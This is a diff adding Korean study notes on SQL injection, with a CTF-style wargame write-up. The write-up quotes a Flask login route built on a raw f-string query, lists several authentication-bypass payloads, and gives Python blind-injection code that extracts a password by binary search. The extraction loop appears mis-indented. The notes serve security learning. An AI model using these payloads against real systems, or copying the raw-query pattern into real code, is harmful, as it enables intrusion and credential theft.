@@ -553,6 +553,124 @@ app.run(host="0.0.0.0", port=8000)
 
 ## SQL Injection
 
+데이터베이스
+DBMS 
+- 데이터베이스 관리 시스템
+- Codd의 12가지 규칙이 있음
+- 기록, 조회, 수정, 삭제 가능 (CRUD)
+- 관계형:  테이블(행, 열) 형식
+	- MySQL, MariaDB, PostgreSQL, SQLite
+- 비관계형: 키-값 형식
+	- MongoDB, CouchDB, Redis
+RDBMS
+- 관계형 데이터베이스 관리 시스템
+
+### SQL
+Structured Query Language
+
+RDBMS의 데이터를 정의하고 조작하기 위해 고안된 언어
+
+|**언어**|**설명**|
+|---|---|
+|DDL (Data Definition Language)|데이터 정의 언어. 데이터베이스 생성/수정/삭제|
+|DML (Data Manipulation Language)|데이터 조작 언어. 데이터베이스 내 데이터 조회/저장/수정/삭제 등|
+|DCL (Data Control Language)|데이터베이스 설정 언어. 데이터베이스의 권한 부여 및 박탈|
+
+### SQL Injection
+
+Injection 공격
+- 유저의 입력값이 어플리케이션의 처리과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점을 이용함
+
+Blind SQL Injection
+- SQL의 답을 TRUE/FALSE로 만들어서 답을 유츄하는 SQL injection 방식
+- 화면에서 직접 확인하지 못할때 사용
+- 많은 시간을 들여야하므로 스크립트를 작성해서 사용
+
+SQL injection 방어 방법
+- Prepared Statement
+- Object Relational Mapping (ORM)
+
+### wargame
+
+**simple_sqli**
+관리자 계정으로 로그인하면 출력되는 flag를 획득
+
+/login
+- 입력받은 ID/PW를 데이터베이스에서 조회
+- 해당하는 데이터가 있는 경우 로그인 수행
+
+```python
+@app.route('/login', methods=['GET', 'POST']) 
+# Login 기능에 대해 GET과 POST HTTP 요청을 받아 처리함
+def login(): # login 함수 선언
+	if request.method == 'GET': # 이용자가 GET 메소드의 요청을 전달한 경우,
+		# 이용자에게 ID/PW를 요청받는 화면을 출력  
+		return render_template('login.html') 
+	else: # POST 요청을 전달한 경우
+		# 이용자의 입력값인 userid를 받은 뒤, 
+		userid = request.form.get('userid') 
+		# 이용자의 입력값인 userpassword를 받고
+		userpassword = request.form.get('userpassword') 
+		# users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴 
+		res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
+		if res: # 쿼리 결과가 존재하는 경우 
+			# 로그인할 계정을 해당 쿼리 결과의 결과에서 불러와 사용
+			userid = res[0] 
+			# 이 때, 로그인 계정이 관리자 계정인 경우 
+			if userid == 'admin':
+				# flag를 출력
+				return f'hello {userid} flag is {FLAG}'  
+			# 관리자 계정이 아닌 경우, 웰컴 메시지만 출력 
+			return f'<script>alert("hello {userid}");history.go(-1);</script>' 
+		# 일치하는 회원 정보가 없는 경우 로그인 실패 메시지 출력 
+		return '<script>alert("wrong");history.go(-1);</script>'
+```
+- `res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')`
+	- 이 부분에서 userid, userpassword를 유저 입력값에서 가져오므로 sql injection 취약점이 있음(Raw query)
+	- 로그인 페이지에서 userid 칸의 마지막에  `" -- ` 를  넣으면 `and userpassword="{userpassword}"` 을 주석 처리 할수 있음
+- 여러 방법이 있음
+	- SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"
+	- SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"
+	- SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"
+	- SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"
+
+**Blind SQL injection**
+1) 이진 탐색을 사용해서 비밀번호 길이 획득
+```python
+def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int: 
+	while 1: 
+		mid = (low+high) // 2 
+		if low+1 >= high:
+			break 
+		query = query_tmpl.format(val=mid) 
+		if "hello" in self._sqli(query).text: 
+			high = mid 
+		else: 
+			low = mid 
+	return mid 
+
+# attack methods 
+def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
+	query_tmpl =\
+	f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})" 
+	pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len) 
+	return pw_len
+```
+2) 이진탐색을 사용해서 blind sql injection 수행 -> 비밀번호 획득
+```python
+def _find_password(self, user: str, pw_len: int) -> str: 
+	pw = '' 
+	for idx in range(1, pw_len+1): 
+		query_tmpl = \
+			f"((SELECT SUBSTR(userpassword,{idx},1) WHERE userid=\"{user}\") < CHAR({{val}}))" 
+	pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e)) 
+	print(f"{idx}. {pw}") 
+	return pw
+```
+
+
+
+
 ## Command Injection
 
 ## File Vulnerability
